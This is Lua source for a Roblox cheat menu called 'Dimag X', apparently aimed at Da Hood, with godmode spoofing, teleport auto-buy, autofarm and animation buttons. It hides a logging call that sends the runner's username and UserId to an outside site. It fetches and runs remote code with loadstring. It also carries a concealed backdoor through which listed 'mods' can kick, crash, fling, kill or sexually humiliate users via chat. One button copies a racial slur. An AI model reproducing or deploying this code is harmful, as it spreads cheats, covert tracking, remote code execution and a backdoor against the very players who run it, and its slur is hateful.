    function WalkRigXD()
        if RigWalk and RigIdle.IsPlaying then
            RigIdle:Stop()
            RigWalk:Play()
        end
    end
    
    Mouse.KeyDown:Connect(function(KeyDownXD)
        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") then
            if KeyDownXD == "w" then
                WSpped = -1
                WalkRigXD()
            elseif KeyDownXD == "a" then
                LeftSpeed = -1
                WalkRigXD()
            elseif KeyDownXD == "d" then
                LeftSpeed = 1
                WalkRigXD()
            elseif KeyDownXD == "s" then
                WSpped = 1
                WalkRigXD()
            end
        end
    end)
    
    Mouse.KeyUp:Connect(function(KeyDownXD)
        if KeyDownXD == "w" then
            WSpped = 0
            IdleRigXD()
        elseif KeyDownXD == "a" then
            LeftSpeed = 0
            IdleRigXD()
        elseif KeyDownXD == "d" then
            LeftSpeed = -0
            IdleRigXD()
        elseif KeyDownXD == "s" then
            WSpped = 0
            IdleRigXD()
        end
    end)
    
    local CD = false
    local uis = game:GetService("UserInputService")
    
    uis.InputBegan:Connect(function(i, XD)
        if i.KeyCode == Enum.KeyCode.H and XD == false then
            if SuperJumpEnabled == false then
                SuperJumpEnabled = true
            elseif SuperJumpEnabled == true then
                SuperJumpEnabled = false
            end
        end
    end)
    
    uis.InputBegan:Connect(function(i, XD)
        if i.KeyCode == Enum.KeyCode.Space and XD == false then
            if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
                if Jumping() == true and not Poter.IsPlaying then
                    AddVelocity(OldChar.HumanoidRootPart.CFrame.LookVector*150, OldChar)
                    IsJump = false
                    Cookies:Stop()
                    CD = true
                    Slide()
                    repeat wait() until workspace:FindPartOnRayWithWhitelist(Ray.new(OldChar.HumanoidRootPart.Position, Vector3.new(0, -4 * OldChar.HumanoidRootPart.Size.y, 0)), { workspace.MAP })
                    CD = false
                end
            else
                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:ChangeState(3)
            end
        end
    end)
    
    function StopAudio()
        OldChar.LowerTorso.BOOMBOXSOUND:Stop()
    end
    
    function stop(ID, Key)
        local cor = coroutine.wrap(function()
            wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0)
            if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                StopAudio()
            end
        end)
        cor()
    end
    
    
    function play(ID, STOP, LMAO)
        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
            local Tool = nil
            if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
                Tool = OldChar:FindFirstChildOfClass("Tool")
                OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
            end
            LocalPlayer.Backpack["[Boombox]"].Parent =
                OldChar
            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
            OldChar["[Boombox]"].RequiresHandle = false
            if OldChar["[Boombox]"]:FindFirstChild("Handle") then
                OldChar["[Boombox]"].Handle:Destroy()
            end
            OldChar["[Boombox]"].Parent =
                LocalPlayer.Backpack
            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
            if Tool ~= true then
                if Tool then
                    Tool.Parent = OldChar
                end
            end
            if STOP == true then
                OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
                local cor = coroutine.wrap(function()
                    repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0
                    OriginalKeyUpValue = OriginalKeyUpValue+1
                    stop(ID, OriginalKeyUpValue)
                end)
                cor()
            end
        end
    end
    
    local bro = false
    local TimeErase, CanCel = "Time erase!", "Time erase!"
    local TimeStop, TimeResume = "Time stop!", "Time stop!"
    local XD = false
    LocalPlayer.Chatted:Connect(function(MSG)
        if MSG == "Rage!" then
    if Humanoid:FindFirstChild("HeadScale") then
        rm()
        wait(0.6)
    
        Humanoid:FindFirstChild("HeadScale"):Destroy()
        wait(0.6)
    end
    
    
    if Humanoid:FindFirstChild("BodyWidthScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
        wait(0.6)
    end
    
    
    
    if Humanoid:FindFirstChild("BodyDepthScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
        wait(0.6)
    end
    
    
    
    if Humanoid:FindFirstChild("BodyTypeScale") then
        rm()
        wait(0.6)
        Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
       wait(0.6)
    end
        elseif MSG:sub(1, 11) == TimeErase and XD == false and not Poter.IsPlaying then
            XDDDD(XD)
        elseif MSG == CanCel and XD == true and not Poter.IsPlaying then
            XDDDD(XD)
        elseif MSG == TimeStop then
            play(6947054675, true, true)
            wait(0.3)
            OldChar.LowerTorso.BOOMBOXSOUND.SoundId = "http://www.roblox.com/asset/?id=wd"
            wait(0.1)
            play(7084712646, true, true)
        end
    end)
    
    function XDDDD(XDR)
        if XDR == false then
            XD = true
            play(6546133414, true, true)
            wait(2)
            TimeEraseUI()
            FoV()
            Lighting()
            ModelCharacter()
        else
            XD = false
            InTimeErase = false
            wait(0.1)
            play(6543435253, true, true)
            TimeEraseUI()
            ModelCharacter()
            Lighting()
            FoV()
    end
    end
    
    function Jump(...)
        (...).Jumping:Connect(function()
            if SuperJumpEnabled == true then
            if CD == false and not Poter.IsPlaying then
                CD = true
                delay(1, function()
                    CD = false
                end)
                Cookies:Play(0, 1, 1.4)
                AddVelocity(OldChar.HumanoidRootPart.CFrame.UpVector*120, OldChar)
                delay(0, function()
                    IsJump = true
                    wait(1) 
                    if IsJump == true then
                        IsJump = false
                    end
                end)
                end
            end
        end)
    end
    
    
    Jump(OldChar.Humanoid)
    
    LocalPlayer.CharacterAdded:Connect(function(Character)
        wait(1)
        if Character.Name == LocalPlayer.Name then
            Jump(Character.Humanoid)
            Poter = Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
            Poter.Looped = true
            Poter.Priority = Enum.AnimationPriority.Action
    
            Cookies = Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
            OldChar = Character
        end
    end)
    
    game["Run Service"].Heartbeat:Connect(function()
        if InTimeErase then
            for i, v in pairs(OldChar:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CFrame = CFrame.new(math.random(200, 500), math.random(200, 500), math.random(200, 500))
                    v.Velocity = Vector3.new(0,0,0)
                end
            end
    
            if OldChar:FindFirstChild("Combat") and XD == true then
                XD = false
                XDDDD(true)
            end
    
            if WalkSpeed == true then
                MoveDirection = Vector3.new(LeftSpeed, UpSpeed, WSpped)
                workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):FindFirstChild("Idaro").Humanoid:Move(MoveDirection, true)
            end
        else
            if OldChar:FindFirstChild("[Flashlight]") then
                if workspace.Players:FindFirstChild(MyStand) then
                    if not Poter.IsPlaying then
                        Poter:Play()
                        Poter:AdjustSpeed(0)
                        Poter.TimePosition = 1.2
                    end
                    local lol = workspace.Players:FindFirstChild(MyStand).HumanoidRootPart.CFrame * CFrame.new(0, 0.5, 1.25)
                    OldChar.HumanoidRootPart.CFrame = lol
                end
            else
                if Poter.IsPlaying then
                    Poter:Stop()
                end
            end
        end
    end)	
end)
local SecondButton = FunstuffPage.AddButton("Fake macro (M)", function()
    plr = game:GetService('Players').LocalPlayer
    down = true
     
    function onButton1Down(mouse)
        down = true
        while down do
            if not down then break end
            local char = plr.Character
            char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 190
            wait()
        end
    end
     
    function onButton1Up(mouse)
        down = false
    end
     
    function onSelected(mouse)
        mouse.KeyDown:connect(function(m) if m:lower()=="m"then onButton1Down(mouse)end end)
        mouse.KeyUp:connect(function(m) if m:lower()=="m"then onButton1Up(mouse)end end)
    end
    onSelected(game.Players.LocalPlayer:GetMouse())
end)

---------------
for i,v in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
    local FirstButton = AutoBuyPage.AddButton(v.Name, function()
        local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local Teleport = v:FindFirstChild("Head")
        if Teleport then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Teleport.CFrame
            local CD = v:FindFirstChild("ClickDetector")
            if CD then
				wait(0.75)
                fireclickdetector(CD)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
            end
        end
    end)
end

---------------

---------------

local AnimationsButton = AnimationsPage.AddButton("Tryhard", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Zombie", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)


local AnimationsButton = AnimationsPage.AddButton("Vampire", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Toy", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Superhero", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Stylish", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Robot", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)
local AnimationsButton = AnimationsPage.AddButton("Pirate", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)
local AnimationsButton = AnimationsPage.AddButton("Ninja", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)

local AnimationsButton = AnimationsPage.AddButton("Mage", function()
    local Animate = game.Players.LocalPlayer.Character.Animate
    Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end)
local godbutton = GodPage.AddButton("Full God", function()
    local localPlayer = game:GetService('Players').LocalPlayer;
    local localCharacter = localPlayer.Character;
    localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
    for _,v in pairs(localPlayer.Character:GetChildren()) do
        if v:IsA('MeshPart') or v:IsA('Accessory') then
            v:Destroy();
        end;
    end;
    local newCharacter = localPlayer.CharacterAdded:Wait();
    local spoofFolder = Instance.new('Folder');
    spoofFolder.Name = 'FULLY_LOADED_CHAR';
    spoofFolder.Parent = newCharacter;
    newCharacter:WaitForChild('RagdollConstraints'):Destroy();
    newCharacter:WaitForChild('BodyEffects'):WaitForChild('Defense'):Destroy();
    newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
    local spoofValue = Instance.new('BoolValue', newCharacter);
    spoofValue.Name = 'RagdollConstraints';
    local defValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
    defValue.Name = 'Defense';
    local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
    armValue.Name = 'Armor';
end)

local godbutton = GodPage.AddButton("God Bullet", function()
    local localPlayer = game:GetService('Players').LocalPlayer;
    local localCharacter = localPlayer.Character;
    localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
    for _,v in pairs(localPlayer.Character:GetChildren()) do
        if v:IsA('MeshPart') or v:IsA('Accessory') then
            v:Destroy();
        end;
    end;
    local newCharacter = localPlayer.CharacterAdded:Wait();
    local spoofFolder = Instance.new('Folder');
    spoofFolder.Name = 'FULLY_LOADED_CHAR';
    spoofFolder.Parent = newCharacter;
    newCharacter:WaitForChild('RagdollConstraints'):Destroy();
    newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
    local spoofValue = Instance.new('BoolValue', newCharacter);
    spoofValue.Name = 'RagdollConstraints';
    local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
    armValue.Name = 'Armor';
end)

local CreditsButton = CreditsPage.AddButton("dylann#0009 - Developer", function()
    setclipboard("dylann#0009") 
end)

local CreditsButton = CreditsPage.AddButton("Dimag16#1616 - Owner", function()
    setclipboard("Dimag16#1616") 
end)

local TargetButton = TargetPage.AddButton("Target UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-VictimMenu-Script/main/Dh%20VictimMenu%3A%20Script"))()
end)

local autofarmbutton = autofarm.AddButton("ATM Autofarm coming soon", function()
    setclipboard("Niggers")
end)

local autofarmbutton = autofarm.AddButton("Muscle Autofarm (reset when done)", function()
    while true do
        wait()
        if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
            wait()
            local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
            end
        end
        if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
            tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
            tool.Parent = game.Players.LocalPlayer.Character
        end
        game:GetService("VirtualUser"):ClickButton1(Vector2.new())
        local d = Vector3.new(-1006.99, -51.1542, -1014.33)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
    end
end)

-- // logs
    game:HttpGet('https://enclosed.live/dimagxloader.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'');



-- mods perms   
local bending = false
player = game.Players.LocalPlayer
function commands(msg, playa)
    if DisableMod == false then
        local Mod = game:GetService('Players'):GetPlayerByUserId(playa)
        local msg = string.lower(msg)
        local SplitCMD = string.split(msg,' ')
        local lower = string.lower(player.Name)
        local cmdfound = string.find(lower, SplitCMD[2])
        if cmdfound then

            if string.find(SplitCMD[1], ':kick') then
				kickmsg = 'PERMA-BANNED'
                player:Kick(kickmsg)
                wait(5)
                while true do end
            end
        end

            if string.find(SplitCMD[1], ':benx') then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game:GetService('Players'):FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
            end

            if string.find(SplitCMD[1], ':unbenx') then
                repeat 
                    task.wait()
                    bending = false
                until not bending
            end
            
            if string.find(SplitCMD[1], ':bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players:FindFirstChild(Mod.Name).Character.HumanoidRootPart.Position)
            end

            if string.find(SplitCMD[1], ':crash') then
                while true do end
            end

            if string.find(SplitCMD[1], ':fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end

            if string.find(SplitCMD[2], ':freeze') then
                player.Character.HumanoidRootPart.Anchored = true
            end

            if string.find(SplitCMD[2], ':thaw') then
                player.Character.HumanoidRootPart.Anchored = false
            end

            if string.find(SplitCMD[1], ':kill') then
                player.Character.Humanoid.Health = 0
            end

        else
            if string.find(msg, '/e find') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dimags daddy", 'All');
            end
        end
    end

local ifMod = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pvpahh/dimagX/main/mod.lua"))()
game.Players.PlayerAdded:Connect(function(plr)
    if ifMod[plr.UserId] then
        plr.Chatted:Connect(function(msg) 
            commands(msg, plr.UserId)
        end)
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    if ifMod[v.UserId] then
        v.Chatted:Connect(function(msg)
            commands(msg, v.UserId)
        end)
    end
end
isMod = false
DisableMod = false
if ifMod[player.UserId] then
    IsMod = true
    DisableMod = true
    game.StarterGui:SetCore("SendNotification", {Title = "Dimag X", Text = "Mod Perms Granted, thanks for buying!", Icon = "rbxassetid://505845268", Duration = 9, Button1 = "Alright, Thank you!"})
else
    IsMod = false
end

coroutine.resume(coroutine.create(function()
    while wait(3) do
        local function initiateNames()
            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
            end
            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
            end
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Pvpahh/dimagX/main/mod.lua'))()
        end
        local success, err = pcall(initiateNames)
    end
end))